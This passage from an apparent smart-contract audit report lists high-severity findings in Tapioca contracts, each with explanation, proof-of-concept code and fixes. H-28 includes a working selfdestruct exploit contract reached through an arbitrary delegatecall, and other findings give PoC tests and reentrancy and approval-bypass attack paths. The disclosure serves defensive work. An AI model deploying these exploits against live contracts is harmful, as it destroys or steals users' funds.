The internal function iterates through the list of reward tokens specified by the user after calculating the claimable amount for each token in the STORAGE array `twTAP.rewardTokens[]`. Unfortunately, there is no check if the `_rewardTokens` contain duplicated reward tokens, and the function `claimable(_tokenId)` is not called after each iteration, which allows the attacker to manipulate the function call using the same reward address repeatedly.

For example,

*   STORAGE array `rewardTokens[] = [usdc, usdt]`
*   The function `_claimRewardsOn()` is called with `_rewardTokens[] = [usdt, usdt]`. In each iteration, the `claimableIndex` will be `rewardTokenIndex[usdc] = 0`, which transfers the usdt two times to the attacker.

### Recommended Mitigation Steps

One solution to mitigate this issue is to require the MEMORY array `_rewardTokens` to be sorted in ascending order.

```solidity
function _claimRewardsOn(
    uint256 _tokenId,
    address _to,
    IERC20[] memory _rewardTokens
) internal {
    uint256[] memory amounts = claimable(_tokenId);
    unchecked {
        uint256 len = _rewardTokens.length;
        for (uint256 i = 0; i < len; ) {
            // CHANGE HERE
            if (i != 0) {
                require(_rewardTokens[i] > _rewardTokens[i-1]);
            }

            uint256 claimableIndex = rewardTokenIndex[_rewardTokens[i]];
            uint256 amount = amounts[i];

            if (amount > 0) {
                // Math is safe: `amount` calculated safely in `claimable()`
                claimed[_tokenId][claimableIndex] += amount;
                rewardTokens[claimableIndex].safeTransfer(_to, amount);
            }
            ++i;
        }
    }
}
```

By ensuring that the reward tokens are sorted in ascending order, we can prevent the exploit where the attacker claims the same reward token multiple times and effectively mitigate the vulnerability.

**[0xRektora (Tapioca) confirmed via duplicate issue 1304](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1304)**

***

## [[H-28] TOFT and USDO Modules Can Be Selfdestructed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1083)
*Submitted by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1083), also found by [BPZ](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1682), [Breeje](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1560), [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1559), [offside0011](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1442), [Kaysoft](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1403), [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1328), [0xrugpull\_detector](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1185), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1027), [CrypticShepherd](https://github.com/code-423n4/2023-07-tapioca-findings/issues/913), [ACai](https://github.com/code-423n4/2023-07-tapioca-findings/issues/791), [kodyvim](https://github.com/code-423n4/2023-07-tapioca-findings/issues/523), and [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/146)*

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L184-L193> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L160-L168> 

https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L189-L200> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L152-L162> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L169-L1788> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOMarketModule.sol#L168-L176> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOOptionsModule.sol#L174-L185>

All TOFT and USDO modules have public functions that allow an attacker to supply an address `module` that is later used as a destination for a delegatecall. This can point to an attacker-controlled contract that is used to selfdestruct the module.

```js
    // USDOLeverageModule:leverageUp
    function leverageUp(
        address module,
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload
    ) public {
        // .. snip ..
        (bool success, bytes memory reason) = module.delegatecall( //@audit-issue arbitrary destination delegatecall
            abi.encodeWithSelector(
                this.leverageUpInternal.selector,
                amount,
                swapData,
                externalData,
                lzData,
                leverageFor
            )
        );

        if (!success) {
            if (balanceAfter - balanceBefore >= amount) {
                IERC20(address(this)).safeTransfer(leverageFor, amount);
            }
            revert(_getRevertMsg(reason)); //forward revert because it's handled by the main executor
        }
        // .. snip ..
    }
```

### Impact

Both BaseTOFT and BaseUSDO initialize the module addresses to state variables in the constructor. Because there are no setter functions to adjust these variables post-deployment, the modules are permanently locked to the addresses specified in the constructor. If those addresses are selfdestructed, the modules are rendered unusable and all calls to these modules will revert. This cannot be repaired.

[BaseUSDO.sol:constructor](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/BaseUSDO.sol#L67-L80)

```js
    // BaseUSDO.sol:constructor
    constructor(
        address _lzEndpoint,
        IYieldBoxBase _yieldBox,
        address _owner,
        address payable _leverageModule,
        address payable _marketModule,
        address payable _optionsModule
    ) BaseUSDOStorage(_lzEndpoint, _yieldBox) ERC20Permit("USDO") {
        leverageModule = USDOLeverageModule(_leverageModule);
        marketModule = USDOMarketModule(_marketModule);
        optionsModule = USDOOptionsModule(_optionsModule);


        transferOwnership(_owner);
    }
```

### Proof of Concept

Attacker can deploy the `Exploit` contract below, and then call each of the vulnerable functions with the address of the `Exploit` contract as the `module` parameter. This will cause the module to selfdestruct, rendering it unusable.

```js
pragma solidity ^0.8.18;

contract Exploit {
    address payable constant attacker = payable(address(0xbadbabe));
    fallback() external payable {
        selfdestruct(attacker);
    }
}
```

### Recommended Mitigation Steps

The `module` parameter should be removed from the calldata in each of the vulnerable functions. Since the context of the call into these functions are designed to be delegatecalls and the storage layouts of the modules and the Base contracts are the same, the `module` address can be retreived from storage instead. This will prevent attackers from supplying arbitrary addresses as delegatecall destinations.

**[0xRektora (Tapioca) confirmed via duplicate issue 146](https://github.com/code-423n4/2023-07-tapioca-findings/issues/146)**

***

## [[H-29] Exercise option cross chain message in the (m)TapiocaOFT will always revert in the destination, losing debited funds in the source chain](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1069)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1069), also found by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1132) and [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1310)*

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L539-L545>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L153-L159>

Exercise option cross chain message in the `(m)TapiocaOFT` will always revert in the destination, but works in the source chain, where it debits the funds from users. Thus, these funds will not be credited in the destination and are forever lost.

### Proof of Concept

In the `BaseTOFT`, if the packet from the received cross chain message in `lzReceive()` is of type `PT_TAP_EXERCISE`, it delegate calls to the `BaseTOFTOptionsModule`:

```solidity
function _nonblockingLzReceive(
    uint16 _srcChainId,
    bytes memory _srcAddress,
    uint64 _nonce,
    bytes memory _payload
) internal virtual override {
    uint256 packetType = _payload.toUint256(0);
    ...
    } else if (packetType == PT_TAP_EXERCISE) {
        _executeOnDestination(
            Module.Options,
            abi.encodeWithSelector(
                BaseTOFTOptionsModule.exercise.selector,
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload
            ),
            _srcChainId,
            _srcAddress,
            _nonce,
            _payload
        );
    ...
```

In the `BaseTOFTOptionsModule`, the `exercise()` function is declared as:

```solidity
function exercise(
    address module,
    uint16 _srcChainId,
    bytes memory _srcAddress,
    uint64 _nonce,
    bytes memory _payload
) public {
    ...
}
```

Notice that the `address module` argument is specified in the `exercise()` function declaration, but not in the `_nonBlockingLzReceive()` call to it. This will make the message always revert because it fails when decoding the arguments to the function call, due to the extra `address module` argument.

The following POC illustrates this behaviour. The `exerciseOption()` cross chain message fails on the destination:

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTOptionsModule} from "contracts/tOFT/modules/BaseTOFTOptionsModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";
import {ITapiocaOptionsBrokerCrossChain} from "tapioca-periph/contracts/interfaces/ITapiocaOptionsBroker.sol";

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 internal constant PT_TAP_EXERCISE = 777;

    event MessageFailed(uint16 _srcChainId, bytes _srcAddress, uint64 _nonce, bytes _payload, bytes _reason);

    function test_POC_ExerciseWrongArguments() public {
        vm.createSelectFork("https://eth.llamarpc.com");

        address optionsModule_ = address(new BaseTOFTOptionsModule(address(LZ_ENDPOINT), address(0), IYieldBoxBase(address(2)), "SomeName", "SomeSymbol", 18, block.chainid));

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            address(0),
            IYieldBoxBase(address(3)),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(address(2)),
            payable(address(3)),
            payable(optionsModule_)
        );

        address user_ = makeAddr("user");
        deal(user_, 2 ether);
        vm.prank(user_);
        tapiocaOft_.wrap{value: 1 ether}(user_, user_, 1 ether);

        ITapiocaOptionsBrokerCrossChain.IExerciseOptionsData memory optionsData_; 
        ITapiocaOptionsBrokerCrossChain.IExerciseLZData memory lzData_;
        ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData memory tapSendData_;
        ICommonData.IApproval[] memory approvals_;

        optionsData_.from = user_;
        optionsData_.target = user_;
        optionsData_.paymentTokenAmount = 1 ether;
        optionsData_.oTAPTokenID = 1;
        optionsData_.paymentToken = address(0);
        optionsData_.tapAmount = 1 ether;

        lzData_.lzDstChainId = 102;
        lzData_.zroPaymentAddress = address(0);
        lzData_.extraGas = 200_000;

        tapSendData_.withdrawOnAnotherChain = false;
        tapSendData_.tapOftAddress = address(0);
        tapSendData_.lzDstChainId = 102;
        tapSendData_.amount = 0;
        tapSendData_.zroPaymentAddress = address(0);
        tapSendData_.extraGas = 0;

        tapiocaOft_.setTrustedRemoteAddress(102, abi.encodePacked(tapiocaOft_));

        vm.prank(user_);
        tapiocaOft_.exerciseOption{value: 1 ether}(
            optionsData_,
            lzData_,
            tapSendData_,
            approvals_
        );

        bytes memory lzPayload_ = abi.encode(
            PT_TAP_EXERCISE,
            optionsData_,
            tapSendData_,
            approvals_
        );

        vm.prank(LZ_ENDPOINT);
        vm.expectEmit(true, true, true, true, address(tapiocaOft_));
        emit MessageFailed(102, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_, vm.parseBytes("0x4e487b710000000000000000000000000000000000000000000000000000000000000041"));
        tapiocaOft_.lzReceive(102, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
    }
}
```

</details>

### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

Adding the extra module parameter when encoding the function call in `_nonBlockingLzReceive()` would be vulnerable to someone calling the `BaseTOFTOptionsModule` directly on function `exercise()` with a malicious `module` argument. It's safer to remove the `module` argument and call `exerciseInternal()` directly, which should work since it's a `public` function.

```solidity
function _nonblockingLzReceive(
    uint16 _srcChainId,
    bytes memory _srcAddress,
    uint64 _nonce,
    bytes memory _payload
) internal virtual override {
    uint256 packetType = _payload.toUint256(0);
    ...
    } else if (packetType == PT_TAP_EXERCISE) {
        _executeOnDestination(
            Module.Options,
            abi.encodeWithSelector(
                BaseTOFTOptionsModule.exercise.selector,
                address(optionsModule), // here
                _srcChainId,
                _srcAddress,
                _nonce,
                _payload
            ),
            _srcChainId,
            _srcAddress,
            _nonce,
            _payload
        );
    ...
```

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1069#issuecomment-1701975614)**

***

## [[H-30] `utilization` for `_getInterestRate()` does not factor in interest](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1057)
*Submitted by [ItsNio](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1057), also found by [ItsNio](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1056) and [SaeedAlipoor01988](https://github.com/code-423n4/2023-07-tapioca-findings/issues/15)*

The calculation for `utilization` in `_getInterestRate()` does not factor in the accrued interest. This leads to `_accrueInfo.interestPerSecond` being under-represented, and leading to incorrect interest rate calculation and potentially endangering conditions such as `utilization > maximumTargetUtilization` on line [124](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCommon.sol#L124).

### Proof of Concept

The calculation for `utilization` in the `_getInterestRate()` function for `SGLCommon.sol` occurs on lines [61-64](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCommon.sol#L61-L64) as a portion of the `fullAssetAmount` (which is also problematic) and the `_totalBorrow.elastic`. However, `_totalBorrow.elastic` is accrued by interest on line [99](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCommon.sol#L99). This accrued amount is not factored into the calculation for `utilization`, which will be used to update the new interest rate, as purposed by the comment on line [111](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCommon.sol#L111).

### Recommended Mitigation Steps

Factor in the interest accrual into the `utilization` calculation:

    ...
            // Accrue interest
            extraAmount =
                (uint256(_totalBorrow.elastic) *
                    _accrueInfo.interestPerSecond *
                    elapsedTime) /
                1e18;
            _totalBorrow.elastic += uint128(extraAmount);
            
        +    uint256 fullAssetAmount = yieldBox.toAmount(    
        +        assetId,
        +        _totalAsset.elastic,
        +        false
        +    ) + _totalBorrow.elastic;
            //@audit utilization factors in accrual
        +    utilization = fullAssetAmount == 0
        +   ? 0
        +        : (uint256(_totalBorrow.elastic) * UTILIZATION_PRECISION) /
        +        fullAssetAmount;
    ...

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1057#issuecomment-1701770815)**

***

## [[H-31] Collateral can be locked in BigBang contract when `debtStartPoint` is nonzero](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1046)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1046), also found by [minhtrng](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1667), [RedOneN](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1554), [kutugu](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1470), [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1387), [0xSky](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1370), [0xrugpull\_detector](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1237), [mojito\_auditor](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1225), [plainshift](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1144), [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1112), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/997), [zzebra83](https://github.com/code-423n4/2023-07-tapioca-findings/issues/537), [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/63), and [chaduke](https://github.com/code-423n4/2023-07-tapioca-findings/issues/168)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/Penrose.sol#L395-L397> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L242-L255> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L180-L201> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L512-L520> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L309-L317> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L271>

Following conditions have to be met for this issue to happen:

*   This issue occurs when the BigBang market is not an ETH market.
*   `Penrose.registerBigBang()` being called with `data` param where `data.debtStartPoint` is nonzero.
*   The first borrower borrows using `BigBang.borrow()`, with function param `amount` (borrow amount) has to be less than `debtStartPoint`.

Now `BigBang.getDebtRate()` will always revert and the collateral from the first borrower is locked, because `BigBang.getDebtRate()` is used in `BigBang._accrue()`, and `BigBang._accrue()` is used in every function that involves totalBorrow like in `BigBang.liquidate()`, `BigBang.repay()`.

The reason for the revert is that in `BigBang.getDebtRate()`, `totalBorrow.elastic` which gets assigned to the variable `_currentDebt` (line 186 BigBang.sol) will not be 0, and then on line 192 in the BigBang contract, the `_currentDebt` is smaller than `debtStartPoint` which causes the revert.

As a consequence the collateral is trapped as repay or liquidate requires to call accrue before hand.

### Proof of Concept

The following gist contains a proof of concept to demonstrate this issue.
A non-ETH bigbang market (wbtc market) is deployed with `Penrose::registerBigBang`. Note that the `debtStartPoint` parameter in the init data is non-zero (set to be 1e18).

First we set up the primary eth market:
Some weth is minted and deposited to the ETH market. Then some assets were borrowed against the collateral. This is necessary condition for this bug to happen, which is the ETH market to have some borrowed asset. However, this condition is very likely to be fulfilled, as the primary ETH market would be deployed before any non-eth market.

Now, an innocent user is adding collateral and borrows in the non-eth market (the wbtc market). The issue occurs when the user borrows less than the `debtStartPoint`. If the user should borrow less than the `debtStartPoint`, the `BigBang::accrue` will revert and the collateral is trapped in this Market.

<https://gist.github.com/zzzitron/a6d6377b73130819f15f1e5a2e2a2ba9>

The bug happens here in the line 192 in the `BigBang`.

```solidity
179     /// @notice returns the current debt rate
180     function getDebtRate() public view returns (uint256) {                                                                        
181         if (_isEthMarket) return penrose.bigBangEthDebtRate(); // default 0.5%                                                    
182         if (totalBorrow.elastic == 0) return minDebtRate;                                                                         
183         
184         uint256 _ethMarketTotalDebt = BigBang(penrose.bigBangEthMarket())                                                         
185             .getTotalDebt();                                                                                                      
186         uint256 _currentDebt = totalBorrow.elastic;
187         uint256 _maxDebtPoint = (_ethMarketTotalDebt *                                                                            
188             debtRateAgainstEthMarket) / 1e18;                                                                                     
189 
190         if (_currentDebt >= _maxDebtPoint) return maxDebtRate;
191 
192         uint256 debtPercentage = ((_currentDebt - debtStartPoint) *
193             DEBT_PRECISION) / (_maxDebtPoint - debtStartPoint);
194         uint256 debt = ((maxDebtRate - minDebtRate) * debtPercentage) /
195             DEBT_PRECISION +
196             minDebtRate;
197 
```

### Recommended Mitigation Steps

Consider adding a require statement to `BigBang.borrow()` to make sure that the borrow amount has to be >= `debtStartPoint`.

```solidity
// BigBang
// borrow
247        require(amount >= debtStartPoint);
```

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1046#issuecomment-1701699307)**

***

## [[H-32] Reentrancy in `USDO.flashLoan()`, enabling an attacker to borrow unlimited USDO exceeding the max borrow limit](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1043)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1043), also found by [RedOneN](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1549), [unsafesol](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1356), [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1278), [kodyvim](https://github.com/code-423n4/2023-07-tapioca-findings/issues/947), [ayeslick](https://github.com/code-423n4/2023-07-tapioca-findings/issues/789), [andy](https://github.com/code-423n4/2023-07-tapioca-findings/issues/303), and [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/233)*

Due to an reentrancy attack vector, an attacker can flashLoan an unlimited amount of USDO. For example the attacker can create a malicious contract as the `receiver`, to execute the attack via the `onFlashLoan` callback (line 94 USDO.sol).

The exploit works because `USDO.flashLoan()` is missing a reentrancy protection (modifier).

As a result an unlimited amount of USDO can be borrowed by an attacker via the flashLoan exploit described above.

### Proof of Concept

Here is a POC that shows an exploit:

<https://gist.github.com/zzzitron/a121bc1ba8cc947d927d4629a90f7991>

To run the exploit add this malicious contract into the contracts folder:

<https://gist.github.com/zzzitron/8de3be7ddf674cc19a6272b59cfccde1>


### Recommended Mitigation Steps

Consider adding some reentrancy protection modifier to `USDO.flashLoan()`.

**[0xRektora (Tapioca) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1043#issuecomment-1691816035):**
 > Should be `High` severity, could really harm the protocol.

**[LSDan (Judge) increased severity to High](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1043#issuecomment-1723621757)**

***

## [[H-33] `BaseTOFTLeverageModule.sol`: `leverageDownInternal` tries to burn tokens from wrong address](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1034)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1034), also found by [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/725)*

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L212> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L269-L277>

The function `sendForLeverage` is used to interact with the USDO token on a different chain. Lets assume the origin of the tx is chain A, and the destination is chain B. The BaseTOFT contract sends a message through the lz endpoints to make a call in the destination chain.

The flow of control is as follows:

Chain A : user -call-> BaseTOFT.sol:`sendForLeverage` -delegateCall-> BaseTOFTLeverageModule.sol:`sendForLeverage` -call-> lzEndpointA

Chain B : lzEndpointB -call-> BaseTOFT.sol:`_nonblockingLzReceive` -delegateCall-> BaseTOFTLeverageModule.sol:`leverageDown` -delegateCall-> `leverageDownInternal`

For the last call to `leverageDownInternal`, the `msg.sender` is the lzEndpointB. This is because all the calls since then have been delegate calls, and thus msg.sender has not been able to change. We analyze the `leverageDownInternal` function in this context.

```solidity
function leverageDownInternal(
        uint256 amount,
        IUSDOBase.ILeverageSwapData memory swapData,
        IUSDOBase.ILeverageExternalContractsData memory externalData,
        IUSDOBase.ILeverageLZData memory lzData,
        address leverageFor
    ) public payable {
        _unwrap(address(this), amount);
```

The very first operation is to do an unwrap of the mTapiocaOFT token. This is done by calling `_unwrap` defined in the **same** **contract** as shown.

```solidity
function _unwrap(address _toAddress, uint256 _amount) private {
    _burn(msg.sender, _amount);

    if (erc20 == address(0)) {
        _safeTransferETH(_toAddress, _amount);
    } else {
        IERC20(erc20).safeTransfer(_toAddress, _amount);
    }
}
```

Here we see the contract is trying to burn tokens from the `msg.sender` address. But the issue is in this context, the `msg.sender` is the lzEndpoint on chain B who is doing the call, and they dont have any TOFT tokens there. Thus this call will revert.

The TOFT tokens are actually held within the same contract where the execution is happening. This is because in the `leverageDown` function, we see the contract credit itself with TOFT tokens.

```solidity
 if (!credited) {
    _creditTo(_srcChainId, address(this), amount);
    creditedPackets[_srcChainId][_srcAddress][_nonce] = true;
}
```

Thus the tokens are actually present in `address(this)` and not in `msg.sender`. Thus the burn should be done from `address(this)` and not `msg.sender`. Thus all cross chain calls for this function will fail and revert.

Since this leads to broken functionality, this is considered a high severity issue.

### Proof of Concept

Since no test exists for the `sendForLeverage` function, no POC is provided. However the flow of control and detailed explanation is provided above.

### Recommended Mitigation Steps

Run `_burn(address(this),amount)` to burn the tokens instead of unwrapping. Then do the eth/erc20 transfer from the contract.

**[0xRektora (Tapioca) confirmed via duplicate issue 725](https://github.com/code-423n4/2023-07-tapioca-findings/issues/725)**

***

## [[H-34] `BaseTOFT.sol`: `retrieveFromStrategy` can be used to manipulate other user's positions due to absent approval check](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1032)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1032), also found by [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1340), [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1173), and [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1078)*

The function `retrieveFromStrategy` is used to trigger a removal of TOFT tokens from a strategy on a different chain. The function takes the parameter `from`, which is the account whose tokens will be retrieved.

The main issue is that anyone can call this function with any address passed to the `from` parameter. There is no allowance check on the chain, allowing this operation. Let's walk through the steps to see how this is executed.

`BaseTOFT.sol`:`retrieveFromStrategy` is called by the attacker with a `from` address of the victim. This function calls the `retrieveFromStrategy` function in the strategy module.

```solidity
  _executeModule(
    Module.Strategy,
    abi.encodeWithSelector(
        BaseTOFTStrategyModule.retrieveFromStrategy.selector,
        from,
        amount,
        share,
        assetId,
        lzDstChainId,
        zroPaymentAddress,
        airdropAdapterParam
    ),
    false
);
```

`BaseTOFTStrategyModule.sol`:`retrieveFromStrategy` is called. This function packs some data and sends it forward to the lz endpoint. Point to note, is that no approval check is done for the `msg.sender` of this whole setup yet.

```solidity
bytes memory lzPayload = abi.encode(
    PT_YB_RETRIEVE_STRAT,
    LzLib.addressToBytes32(_from),
    toAddress,
    amount,
    share,
    assetId,
    zroPaymentAddress
);
// lzsend(...)
```

After the message is sent, the **lzendpoint** on the receiving chain will call the TOFT contract again. Now, the `msg.sender` is **not** the attacker, but is instead the lzendpoint! The endpoint call gets delegated to the `strategyWithdraw` function in the Strategy module.

```solidity
 (
    ,
    bytes32 from,
    ,
    uint256 _amount,
    uint256 _share,
    uint256 _assetId,
    address _zroPaymentAddress
) = abi.decode(
        _payload,
        (uint16, bytes32, bytes32, uint256, uint256, uint256, address)
    );
```

Here we see the unpacking. note that the second unpacked value is put in the `from` field. This is an address determined by the attacker and passed through the layerzero endpoints. The contract then calls `_retrieveFromYieldBox` to take out tokens from the Yieldbox. They are then sent cross chain back to the `from` address.

```solidity
_retrieveFromYieldBox(_assetId, _amount, _share, _from, address(this));
_debitFrom(
    address(this),
    lzEndpoint.getChainId(),
    LzLib.addressToBytes32(address(this)),
    _amount
);
bytes memory lzSendBackPayload = _encodeSendPayload(
    from,
    _ld2sd(_amount)
);
_lzSend(
    _srcChainId,
    lzSendBackPayload,
    payable(this),
    _zroPaymentAddress,
    "",
    address(this).balance
);
```

Thus it is evident from this call that the YieldBox contract being called has no idea that the original sender was the attacker. Instead, for the YieldBox contract, the `msg.sender` is the current TOFT contract. If users want to use the cross chain operations, they have to give allowance to the TOFT address. Thus we can assume that the victim has already given allowance to this address. Thus the YieldBox thinks the `msg.sender` is the TOFT contract, who is allowed, and thus executes the operations.

Thus we have demonstrated that the attacker is able to call a function on the victim's YieldBox position **without** being given any allowance by setting the victim's address in the `from` field. Thus this is a high severity issue since the victim's tokens are withdrawn and send to a different chain without their consent.

### Proof of Concept

Two lines from the test in test/TapiocaOFT.test.ts is changed to show this issue. Below is the full test for reference. The changed bits are marked with arrows.

<details>

```javascript
it.only("should be able to deposit & withdraw from a strategy available on another layer", async () => {
    const {
        signer,
        erc20Mock,
        mintAndApprove,
        bigDummyAmount,
        utils,
        randomUser, //@audit <------------------------------------- take other user address
    } = await loadFixture(setupFixture)

    const LZEndpointMock_chainID_0 = await utils.deployLZEndpointMock(
        31337
    )
    const LZEndpointMock_chainID_10 = await utils.deployLZEndpointMock(
        10
    )

    const tapiocaWrapper_0 = await utils.deployTapiocaWrapper()
    const tapiocaWrapper_10 = await utils.deployTapiocaWrapper()

    //Deploy YB and Strategies
    const yieldBox0Data = await deployYieldBox(signer)
    const yieldBox10Data = await deployYieldBox(signer)

    const YieldBox_0 = yieldBox0Data.yieldBox
    const YieldBox_10 = yieldBox10Data.yieldBox

    {
        const txData =
            await tapiocaWrapper_0.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_0.address,
                        erc20Mock.address,
                        YieldBox_0.address,
                        31337,
                        signer
                    )
                ).txData,
                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT0 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_0.tapiocaOFTs(
            (await tapiocaWrapper_0.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    // Deploy TapiocaOFT10
    {
        const txData =
            await tapiocaWrapper_10.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_10.address,
                        erc20Mock.address,
                        YieldBox_10.address,
                        10,
                        signer
                    )
                ).txData,
